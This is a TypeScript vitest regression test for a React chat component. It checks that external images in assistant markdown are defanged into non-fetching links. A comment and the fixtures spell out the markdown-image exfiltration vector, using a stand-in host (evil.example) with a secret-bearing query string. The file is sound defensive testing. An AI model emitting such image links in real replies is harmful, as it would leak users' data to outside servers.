import { describe, it, expect } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { markdownComponents } from "./ChatMessage";

// Security regression (audit 2026-08-22): assistant markdown must never auto-fetch
// an external image on render (the `![](http://evil?q=data)` exfil/tracking vector).
// External images are defanged to a non-fetching link; data: URIs (no network) render.
const Img = markdownComponents.img as (props: { src?: string; alt?: string }) => JSX.Element;

describe("markdown image defang", () => {
  it("defangs an external http(s) image to a non-fetching link", () => {
    const html = renderToStaticMarkup(
      createElement(Img, { src: "http://evil.example/x?q=secret", alt: "logo" }),
    );
    expect(html).not.toContain("<img");
    expect(html).toContain("[image: logo]");
    expect(html).toContain('href="http://evil.example/x?q=secret"');
    expect(html).toContain("nofollow");
  });

  it("defangs a protocol-relative image", () => {
    const html = renderToStaticMarkup(
      createElement(Img, { src: "//evil.example/pixel.gif", alt: "" }),
    );
    expect(html).not.toContain("<img");
    expect(html).toContain("[image: image]");
  });

  it("allows a data: URI image (carries no network fetch)", () => {
    const html = renderToStaticMarkup(
      createElement(Img, { src: "data:image/png;base64,iVBOR", alt: "chart" }),
    );
    expect(html).toContain("<img");
    expect(html).toContain('src="data:image/png;base64,iVBOR"');
  });
});
